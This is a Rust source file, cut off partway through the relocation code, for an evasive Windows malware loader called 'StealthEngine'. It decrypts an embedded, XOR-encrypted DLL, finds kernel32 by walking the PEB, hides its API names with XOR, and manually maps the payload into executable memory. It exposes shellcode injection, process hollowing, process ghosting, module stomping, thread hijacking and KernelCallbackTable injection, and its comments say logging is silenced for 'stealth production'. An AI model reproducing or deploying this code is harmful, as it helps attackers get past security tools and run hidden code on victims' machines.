use std::ffi::{c_void, CStr, CString};
use std::mem;
use std::ptr;
use windows::Win32::Foundation::{HANDLE, HMODULE, BOOL, HINSTANCE};
use std::fs::OpenOptions; // ADDED
use std::io::Write; // ADDED
use std::sync::Once; // ADDED

// GLOBAL SINGLETON INSTANCE
static mut INSTANCE: Option<StealthEngine> = None;
static INIT: Once = Once::new();

fn log_debug(_msg: &str) {
    // No-op for stealth production
}

// Embed the Encrypted Nim Stealth Engine
const STEALTH_DLL_BYTES: &[u8] = include_bytes!("../stealth.bin");

// --- Manual Definitions for CreateProcessA (Start) ---
#[repr(C)]
#[derive(Copy, Clone)]
struct SECURITY_Attributes {
    nLength: u32,
    lpSecurityDescriptor: *mut c_void,
    bInheritHandle: BOOL,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct STARTUPINFOA {
    cb: u32,
    lpReserved: *mut u8,
    lpDesktop: *mut u8,
    lpTitle: *mut u8,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct PROCESS_INFORMATION {
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: u32,
    dwThreadId: u32,
}

const STARTF_USESHOWWINDOW: u32 = 0x00000001;
const CREATE_SUSPENDED: u32 = 0x00000004;
const SW_HIDE: u16 = 0;

#[link(name = "kernel32")]
extern "system" {
    fn CreateProcessA(
        lpApplicationName: *const u8,
        lpCommandLine: *mut u8,
        lpProcessAttributes: *const SECURITY_Attributes,
        lpThreadAttributes: *const SECURITY_Attributes,
        bInheritHandles: BOOL,
        dwCreationFlags: u32,
        lpEnvironment: *const c_void,
        lpCurrentDirectory: *const u8,
        lpStartupInfo: *const STARTUPINFOA,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;
}
// --- Manual Definitions for CreateProcessA (End) ---

// --- Minimal PE Structures (To avoid windows crate version hell) ---
#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_FILE_HEADER {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: u32,
    Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_NT_HEADERS64 {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_SECTION_HEADER {
    Name: [u8; 8],
    VirtualSize: u32,
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_BASE_RELOCATION {
    VirtualAddress: u32,
    SizeOfBlock: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_IMPORT_DESCRIPTOR {
    OriginalFirstThunk: u32, // RVA to original unbound IAT (PIMAGE_THUNK_DATA)
    TimeDateStamp: u32,
    ForwarderChain: u32,
    Name: u32,
    FirstThunk: u32, // RVA to IAT (if bound this has actual addresses)
}

#[repr(C)]
#[derive(Copy, Clone)]
struct IMAGE_EXPORT_DIRECTORY {
    Characteristics: u32,
    TimeDateStamp: u32,
    MajorVersion: u16,
    MinorVersion: u16,
    Name: u32,
    Base: u32,
    NumberOfFunctions: u32,
    NumberOfNames: u32,
    AddressOfFunctions: u32,
    AddressOfNames: u32,
    AddressOfNameOrdinals: u32,
}

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const DLL_PROCESS_ATTACH: u32 = 1;

// --- API Hashing & Dynamic Resolution ---

// "VirtualAlloc" ^ 0x55
const ENC_VIRTUAL_ALLOC: &[u8] = &[
    0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x14, 0x39, 0x39, 0x3a, 0x36, 0x55
];
// "VirtualProtect" ^ 0x55
const ENC_VIRTUAL_PROTECT: &[u8] = &[
    0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x05, 0x27, 0x3a, 0x21, 0x30, 0x36, 0x21, 0x00
];
// "VirtualFree" ^ 0x55
const ENC_VIRTUAL_FREE: &[u8] = &[
    0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x13, 0x27, 0x30, 0x30, 0x00
];
// "LoadLibraryA" ^ 0x55
const ENC_LOAD_LIBRARY: &[u8] = &[
    0x19, 0x3a, 0x34, 0x31, 0x19, 0x3c, 0x37, 0x27, 0x34, 0x27, 0x2c, 0x14, 0x55
];
// "GetProcAddress" ^ 0x55
const ENC_GET_PROC_ADDR: &[u8] = &[
    0x12, 0x30, 0x21, 0x05, 0x27, 0x3a, 0x36, 0x14, 0x31, 0x31, 0x27, 0x30, 0x26, 0x26, 0x55
];

type VirtualAllocFn = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
type VirtualProtectFn = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> BOOL;
type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> BOOL;
type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> HMODULE;
type GetProcAddressFn = unsafe extern "system" fn(HMODULE, *const u8) -> usize;
type DllMainFn = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

struct CoreApi {
    v_alloc: VirtualAllocFn,
    // v_protect: VirtualProtectFn, // Unused for now
    // v_free: VirtualFreeFn, // Unused for now
    load_lib: LoadLibraryAFn,
    get_proc: GetProcAddressFn,
}

fn decrypt_str(enc: &[u8]) -> Vec<u8> {
    enc.iter().map(|b| b ^ 0x55).collect()
}

impl CoreApi {
    unsafe fn load() -> Option<Self> {
        let kernel32 = get_kernel32_base()?;
        
        // Helper to get clean CString from possibly null-terminated encrypted bytes
        let to_cstring = |enc: &[u8]| -> Option<CString> {
            let mut v = decrypt_str(enc);
            if v.last() == Some(&0) { v.pop(); }
            CString::new(v).ok()
        };

        // Ensure CStrings stay alive while we get their pointers
        let s_alloc = to_cstring(ENC_VIRTUAL_ALLOC)?;
        let s_load = to_cstring(ENC_LOAD_LIBRARY)?;
        let s_get = to_cstring(ENC_GET_PROC_ADDR)?;

        Some(Self {
            v_alloc: mem::transmute(get_export_addr(kernel32, s_alloc.as_ptr() as *const u8)?),
            load_lib: mem::transmute(get_export_addr(kernel32, s_load.as_ptr() as *const u8)?),
            get_proc: mem::transmute(get_export_addr(kernel32, s_get.as_ptr() as *const u8)?),
        })
    }
}

unsafe fn get_kernel32_base() -> Option<HMODULE> {
    let peb: *const c_void;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    
    let ldr = *((peb as usize + 0x18) as *const *const c_void);
    let mut module_list = *((ldr as usize + 0x10) as *const *const c_void); // Points to LDR_DATA_TABLE_ENTRY via InLoadOrderLinks (LIST_ENTRY)
    let head = module_list;
    
    loop {
        // DllBase is at offset 0x30
        let dll_base = *((module_list as usize + 0x30) as *const isize);
        
        // BaseDllName is at 0x58 (UNICODE_STRING buffer pointer)
        let name_len = *((module_list as usize + 0x58) as *const u16);
        let name_ptr = *((module_list as usize + 0x60) as *const *const u16);
        
        if !name_ptr.is_null() && name_len > 0 {
            let mut name_vec = Vec::new();
            for i in 0..(name_len/2) {
                let c = *name_ptr.add(i as usize) as u8;
                name_vec.push(if c >= b'a' && c <= b'z' { c - 32 } else { c }); // ToUpper
            }
            
             // Simple "KER" prefix check for KERNEL32.DLL
             if name_vec.len() >= 3 && &name_vec[0..3] == b"KER" {
                 return Some(HMODULE(dll_base as *mut c_void));
             }
        }
        
        // Flink is the first member of LIST_ENTRY, effectively the pointer itself
        module_list = *(module_list as *const *const c_void); 
        if module_list == head { break; }
    }
    None
}

unsafe fn get_export_addr(module: HMODULE, func_name_ptr: *const u8) -> Option<usize> {
    let base = module.0 as usize;
    let magic = std::ptr::read_unaligned(base as *const u16);
    if magic != 0x5A4D { return None; }
    
    let lfanew = std::ptr::read_unaligned((base + 0x3C) as *const i32);
    let nt_headers = base + lfanew as usize;
    
    // DataDirectory[0] is Export Directory (RVA at offset 112+24=136 from NT Headers start)
    let export_dir_rva = std::ptr::read_unaligned((nt_headers + 136) as *const u32);
    if export_dir_rva == 0 { return None; }
    
    let export_dir = base + export_dir_rva as usize;
    let names_rva = std::ptr::read_unaligned((export_dir + 32) as *const u32);
    let funcs_rva = std::ptr::read_unaligned((export_dir + 28) as *const u32);
    let ords_rva = std::ptr::read_unaligned((export_dir + 36) as *const u32);
    let num_names = std::ptr::read_unaligned((export_dir + 24) as *const u32) as usize;

    let names = (base + names_rva as usize) as *const u32;
    let funcs = (base + funcs_rva as usize) as *const u32;
    let ords = (base + ords_rva as usize) as *const u16;
    
    let target_name = CStr::from_ptr(func_name_ptr as *const i8).to_bytes();
    
    for i in 0..num_names {
        let name_rva = std::ptr::read_unaligned(names.add(i));
        let name_ptr = (base + name_rva as usize) as *const i8;
        let name = CStr::from_ptr(name_ptr).to_bytes();
        
        if name == target_name {
            let ordinal = std::ptr::read_unaligned(ords.add(i));
            let func_rva = std::ptr::read_unaligned(funcs.add(ordinal as usize));
            return Some(base + func_rva as usize);
        }
    }
    None
}

// Nim FFI Types
type InitStealthFn = unsafe extern "C" fn() -> i32;
type GetStealthHandleFn = unsafe extern "C" fn(u32) -> HANDLE;
type StealthAllocateFn = unsafe extern "C" fn(HANDLE, usize, u32) -> *mut std::ffi::c_void;
type StealthWriteFn = unsafe extern "C" fn(HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize) -> i32;
type StealthProtectFn = unsafe extern "C" fn(HANDLE, *mut std::ffi::c_void, usize, u32) -> i32;
type StealthFreeFn = unsafe extern "C" fn(HANDLE, *mut std::ffi::c_void) -> i32;
type StealthGetContextFn = unsafe extern "C" fn(HANDLE, *mut std::ffi::c_void) -> i32;
type StealthSetContextFn = unsafe extern "C" fn(HANDLE, *const std::ffi::c_void) -> i32;
type StealthSleepFn = unsafe extern "C" fn(u32);
type StealthCrashFn = unsafe extern "C" fn(u32) -> i32;
type StealthKillFn = unsafe extern "C" fn(u32) -> i32;
type StealthManualMapFn = unsafe extern "C" fn(HANDLE, *const c_void) -> u64;
type StealthFindFirstThreadFn = unsafe extern "C" fn(u32) -> u32;
type StealthHijackThreadFn = unsafe extern "C" fn(u32, u64) -> bool;
type StealthCreateRemoteThreadFn = unsafe extern "C" fn(HANDLE, u64) -> bool;
type StealthInjectShellcodeFn = unsafe extern "C" fn(HANDLE, *const c_void, usize) -> bool;
type StealthManualMapExFn = unsafe extern "C" fn(HANDLE, *const c_void, bool) -> u64;
type StealthCreateThreadExFn = unsafe extern "C" fn(HANDLE, *mut c_void, *const c_void, bool) -> i32;
type StealthGhostProcessFn = unsafe extern "C" fn(*const c_void, usize, *const i8) -> HANDLE;
type StealthHollowProcessFn = unsafe extern "C" fn(*const c_void, usize, *const i8) -> HANDLE;
type StealthModuleStompingFn = unsafe extern "C" fn(*const c_void, usize, *const i8) -> HANDLE;
type StealthKCTInjectFn    = unsafe extern "C" fn(HANDLE, i32, *const i8) -> bool;
type StealthKCTAutoInjectFn = unsafe extern "C" fn(HANDLE, *const i8) -> bool;

pub struct StealthEngine {
    pub base_addr: usize,
    pub init: InitStealthFn,
    pub get_handle: GetStealthHandleFn,
    pub allocate: StealthAllocateFn,
    pub write: StealthWriteFn,
    pub protect: StealthProtectFn,
    pub free: StealthFreeFn,
    pub get_ctx: StealthGetContextFn,
    pub set_ctx: StealthSetContextFn,
    pub sleep: StealthSleepFn,
    pub crash: StealthCrashFn,
    pub kill: StealthKillFn,
    pub manual_map: StealthManualMapFn,
    pub find_thread: StealthFindFirstThreadFn,
    pub hijack_thread: StealthHijackThreadFn,
    pub create_thread: StealthCreateRemoteThreadFn,
    pub inject_shellcode: StealthInjectShellcodeFn,
    pub manual_map_ex: StealthManualMapExFn,
    pub create_thread_ex: StealthCreateThreadExFn,
    pub ghost_process: StealthGhostProcessFn,
    pub hollow_process: StealthHollowProcessFn,
    pub stomp_process: StealthModuleStompingFn,
    pub kct_inject: StealthKCTInjectFn,
    pub kct_auto_inject: StealthKCTAutoInjectFn,
}

// Function Names (Hashed with ^ 0x66)
// InitStealthEngine -> 0x2f, 0x08, 0x0f, 0x12, 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x23, 0x08, 0x01, 0x0f, 0x08, 0x03
const ENC_INIT: &[u8] = &[
    0x2f, 0x08, 0x0f, 0x12, 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x23, 0x08, 0x01, 0x0f, 0x08, 0x03
];
// StealthGetHandle -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x21, 0x03, 0x12, 0x2e, 0x07, 0x08, 0x02, 0x0a, 0x03
const ENC_GET_HANDLE: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x21, 0x03, 0x12, 0x2e, 0x07, 0x08, 0x02, 0x0a, 0x03
];
// StealthAllocate -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x27, 0x0a, 0x0a, 0x09, 0x05, 0x07, 0x12, 0x03
const ENC_ALLOC: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x27, 0x0a, 0x0a, 0x09, 0x05, 0x07, 0x12, 0x03
];
// StealthWrite -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x31, 0x14, 0x0f, 0x12, 0x03
const ENC_WRITE: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x31, 0x14, 0x0f, 0x12, 0x03
];
// StealthProtect -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x36, 0x14, 0x09, 0x12, 0x03, 0x05, 0x12
const ENC_PROTECT: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x36, 0x14, 0x09, 0x12, 0x03, 0x05, 0x12
];
// StealthFree -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x20, 0x14, 0x03, 0x03
const ENC_FREE: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x20, 0x14, 0x03, 0x03
];

// StealthGetContext -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x21, 0x03, 0x12, 0x25, 0x09, 0x08, 0x12, 0x03, 0x1e, 0x12
const ENC_GET_CTX: &[u8] = &[
     0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x21, 0x03, 0x12, 0x25, 0x09, 0x08, 0x12, 0x03, 0x1e, 0x12
];
// StealthSetContext -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x35, 0x03, 0x12, 0x25, 0x09, 0x08, 0x12, 0x03, 0x1e, 0x12
const ENC_SET_CTX: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x35, 0x03, 0x12, 0x25, 0x09, 0x08, 0x12, 0x03, 0x1e, 0x12
];

// StealthSleep -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x35, 0x0a, 0x03, 0x03, 0x16
const ENC_SLEEP: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x35, 0x0a, 0x03, 0x03, 0x16
];
// StealthCrash -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x07, 0x15, 0x0e
const ENC_CRASH: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x07, 0x15, 0x0e
];
// StealthKill -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2d, 0x0f, 0x0a, 0x0a
const ENC_KILL: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2d, 0x0f, 0x0a, 0x0a
];

// StealthManualMap -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2b, 0x07, 0x08, 0x13, 0x07, 0x0a, 0x2b, 0x07, 0x16
const ENC_MANUAL_MAP: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2b, 0x07, 0x08, 0x13, 0x07, 0x0a, 0x2b, 0x07, 0x16
];

// StealthFindFirstThread -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x20, 0x0f, 0x08, 0x02, 0x20, 0x0f, 0x14, 0x15, 0x12, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
const ENC_FIRST_THREAD: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x20, 0x0f, 0x08, 0x02, 0x20, 0x0f, 0x14, 0x15, 0x12, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
];

// StealthHijackThread -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2e, 0x0f, 0x0c, 0x07, 0x05, 0x0d, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
const ENC_HIJACK_THREAD: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2e, 0x0f, 0x0c, 0x07, 0x05, 0x0d, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
];

// StealthCreateRemoteThread -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x03, 0x07, 0x12, 0x03, 0x34, 0x03, 0x0b, 0x09, 0x12, 0x03, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
const ENC_CREATE_THREAD: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x03, 0x07, 0x12, 0x03, 0x34, 0x03, 0x0b, 0x09, 0x12, 0x03, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02
];

// StealthInjectShellcode -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2f, 0x08, 0x0c, 0x03, 0x05, 0x12, 0x35, 0x0e, 0x03, 0x0a, 0x0a, 0x05, 0x09, 0x02, 0x03
const ENC_INJECT_SHELLCODE: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2f, 0x08, 0x0c, 0x03, 0x05, 0x12, 0x35, 0x0e, 0x03, 0x0a, 0x0a, 0x05, 0x09, 0x02, 0x03
];

// StealthManualMapEx -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2b, 0x07, 0x08, 0x13, 0x07, 0x0a, 0x2b, 0x07, 0x16, 0x23, 0x1e
const ENC_MANUAL_MAP_EX: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2b, 0x07, 0x08, 0x13, 0x07, 0x0a, 0x2b, 0x07, 0x16, 0x23, 0x1e
];

// StealthCreateThreadEx -> 0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x03, 0x07, 0x12, 0x03, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02, 0x23, 0x1e
const ENC_CREATE_THREAD_EX: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x25, 0x14, 0x03, 0x07, 0x12, 0x03, 0x32, 0x0e, 0x14, 0x03, 0x07, 0x02, 0x23, 0x1e
];

// StealthGhostProcess
const ENC_GHOST: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x21, 0x0e, 0x09, 0x15, 0x12, 0x36, 0x14, 0x09, 0x05, 0x03, 0x15, 0x15
];

// StealthHollowProcess
const ENC_HOLLOW: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2e, 0x09, 0x0a, 0x0a, 0x09, 0x11, 0x36, 0x14, 0x09, 0x05, 0x03, 0x15, 0x15
];

// StealthModuleStomping
const ENC_STOMP: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2b, 0x09, 0x02, 0x13, 0x0a, 0x03, 0x35, 0x12, 0x09, 0x0b, 0x16, 0x0f, 0x08, 0x01
];

// StealthKCTInject
const ENC_KCT_INJECT: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2d, 0x25, 0x32, 0x2f, 0x08, 0x0c, 0x03, 0x05, 0x12
];
// StealthKCTAutoInject
const ENC_KCT_AUTO_INJECT: &[u8] = &[
    0x35, 0x12, 0x03, 0x07, 0x0a, 0x12, 0x0e, 0x2d, 0x25, 0x32, 0x27, 0x13, 0x12, 0x09, 0x2f, 0x08, 0x0c, 0x03, 0x05, 0x12
];

impl StealthEngine {
    pub fn new() -> Option<Self> {
        log_debug("Attempting to load StealthEngine image...");
        let base_opt = Self::load_image();
        if base_opt.is_none() {
            log_debug("load_image() returned None!");
            return None;
        }
        let base_addr = base_opt.unwrap();
        log_debug(&format!("Image loaded at 0x{:x}. Resolving internal exports...", base_addr));
        
        unsafe {
            let get_addr = |enc_name: &[u8]| -> Option<usize> {
                let name_bytes: Vec<u8> = enc_name.iter().map(|b| b ^ 0x66).collect();
                let name_cstring = CString::new(name_bytes).ok()?;
                let h_module = HMODULE(base_addr as *mut c_void);
                get_export_addr(h_module, name_cstring.as_ptr() as *const u8)
            };

            let f_init = get_addr(ENC_INIT)?;
            log_debug(&format!("Resolved Init: 0x{:x}", f_init));
            let f_handle = get_addr(ENC_GET_HANDLE)?;
            let f_alloc = get_addr(ENC_ALLOC)?;
            let f_write = get_addr(ENC_WRITE)?;
            let f_protect = get_addr(ENC_PROTECT)?;
            let f_free = get_addr(ENC_FREE)?;
            let f_get_ctx = get_addr(ENC_GET_CTX)?;
            let f_set_ctx = get_addr(ENC_SET_CTX)?;
            let f_sleep = get_addr(ENC_SLEEP)?;
            let f_crash = get_addr(ENC_CRASH)?;
            let f_kill = get_addr(ENC_KILL)?;
            let f_mmap = get_addr(ENC_MANUAL_MAP)?;
            let f_find_tid = get_addr(ENC_FIRST_THREAD)?;
            let f_hijack = get_addr(ENC_HIJACK_THREAD)?;
            let f_thread = get_addr(ENC_CREATE_THREAD)?;
            let f_inject = get_addr(ENC_INJECT_SHELLCODE)?;
            let f_mam_ex = get_addr(ENC_MANUAL_MAP_EX)?;
            let f_ct_ex = get_addr(ENC_CREATE_THREAD_EX)?;
            let f_ghost = get_addr(ENC_GHOST)?;
            let f_hollow = get_addr(ENC_HOLLOW)?;
            let f_stomp = get_addr(ENC_STOMP)?;
            let f_kct      = get_addr(ENC_KCT_INJECT)?;
            let f_kct_auto = get_addr(ENC_KCT_AUTO_INJECT)?;

            let engine = Self {
                base_addr,
                init: mem::transmute(f_init),
                get_handle: mem::transmute(f_handle),
                allocate: mem::transmute(f_alloc),
                write: mem::transmute(f_write),
                protect: mem::transmute(f_protect),
                free: mem::transmute(f_free),
                get_ctx: mem::transmute(f_get_ctx),
                set_ctx: mem::transmute(f_set_ctx),
                sleep: mem::transmute(f_sleep),
                crash: mem::transmute(f_crash),
                kill: mem::transmute(f_kill),
                manual_map: mem::transmute(f_mmap),
                find_thread: mem::transmute(f_find_tid),
                hijack_thread: mem::transmute(f_hijack),
                create_thread: mem::transmute(f_thread),
                inject_shellcode: mem::transmute(f_inject),
                manual_map_ex: mem::transmute(f_mam_ex),
                create_thread_ex: mem::transmute(f_ct_ex),
                ghost_process: mem::transmute(f_ghost),
                hollow_process: mem::transmute(f_hollow),
                stomp_process: mem::transmute(f_stomp),
                kct_inject:      mem::transmute(f_kct),
                kct_auto_inject:  mem::transmute(f_kct_auto),
            };

            log_debug("All internal functions resolved successfully.");
            Some(engine)
        }
    }

    fn load_image() -> Option<usize> {
        unsafe {
            let api = CoreApi::load();
            if api.is_none() {
                log_debug("CoreApi::load failed!");
                return None;
            }
            let api = api.unwrap();
            
            let mut dll_raw = STEALTH_DLL_BYTES.to_vec();
            log_debug(&format!("Embedded DLL size: {}... Decrypting...", dll_raw.len()));
            for b in dll_raw.iter_mut() { *b ^= 0xAA; }
            
            if dll_raw.len() < 2 {
                log_debug("DLL too small after decryption!");
                return None;
            }

            let raw_ptr = dll_raw.as_ptr() as usize;
            if std::ptr::read_unaligned(raw_ptr as *const u16) != 0x5A4D { 
                log_debug("Invalid Magic (Expected: 0x5A4D)");
                return None; 
            }
            log_debug("DOS Header valid. Reading NT Headers...");

            let lfanew = std::ptr::read_unaligned((raw_ptr + 0x3C) as *const i32) as usize;
            let nt_headers_raw = raw_ptr + lfanew;
            if std::ptr::read_unaligned(nt_headers_raw as *const u32) != 0x00004550 {
                log_debug("Invalid NT Signature");
                return None;
            }

            // SizeOfImage at offset 24 + 56 = 80 from NT Headers
            let image_size = std::ptr::read_unaligned((nt_headers_raw + 80) as *const u32) as usize;
            log_debug(&format!("Required Image Size: {} bytes. Allocating...", image_size));

            let base_addr = (api.v_alloc)(ptr::null(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) as usize; 
            if base_addr == 0 { 
                log_debug("VirtualAlloc failed!");
                return None; 
            }
            log_debug(&format!("Allocated base: 0x{:x}", base_addr));
            
            // SizeOfHeaders at offset 24 + 60 = 84
            let size_of_headers = std::ptr::read_unaligned((nt_headers_raw + 84) as *const u32) as usize;
            log_debug(&format!("Copying PE headers (size: {} bytes)....", size_of_headers));
            ptr::copy_nonoverlapping(dll_raw.as_ptr(), base_addr as *mut u8, size_of_headers);
            
            let num_sections = std::ptr::read_unaligned((nt_headers_raw + 6) as *const u16);
            let sections_ptr = (nt_headers_raw + 24 + std::ptr::read_unaligned((nt_headers_raw + 20) as *const u16) as usize) as *const IMAGE_SECTION_HEADER;
            
            log_debug(&format!("Found {} sections. Copying...", num_sections));
            for i in 0..num_sections {
                let section = &*sections_ptr.add(i as usize);
                let section_size = std::ptr::read_unaligned(std::ptr::addr_of!(section.SizeOfRawData));
                if section_size == 0 { continue; }
                
                let section_va = std::ptr::read_unaligned(std::ptr::addr_of!(section.VirtualAddress));
                let section_ptr_raw = std::ptr::read_unaligned(std::ptr::addr_of!(section.PointerToRawData));
                
                let dest = (base_addr + section_va as usize) as *mut u8;
                let src = (raw_ptr + section_ptr_raw as usize) as *const u8;
                
                log_debug(&format!("  -> Sec {}: VA=0x{:x}, RawPtr=0x{:x}, Size={} bytes", i, section_va, section_ptr_raw, section_size));
                
                // Safety check: is SRC + SIZE within dll_raw bounds?
                if section_ptr_raw as usize + section_size as usize > dll_raw.len() {
                    log_debug(&format!("  [!] Section {} out of bounds of dll_raw! (RawPtr+Size={} > DLL_Len={})", i, section_ptr_raw as usize + section_size as usize, dll_raw.len()));
                    return None;
                }
                
                ptr::copy_nonoverlapping(src, dest, section_size as usize);
            }
            log_debug("Sections copied successfully.");
            
            // ImageBase at offset 24 + 24 = 48
            let image_base = std::ptr::read_unaligned((nt_headers_raw + 48) as *const usize);
            let delta = base_addr as isize - image_base as isize;
            if delta != 0 {
                log_debug(&format!("Applying Relocations (Delta: 0x{:x})...", delta));
                // BaseReloc Directory (index 5) starts at offset 24 + 112 + 5*8 = 176
                let reloc_dir_va = std::ptr::read_unaligned((nt_headers_raw + 176) as *const u32);
                let reloc_dir_size = std::ptr::read_unaligned((nt_headers_raw + 180) as *const u32);
                
                if reloc_dir_size > 0 {
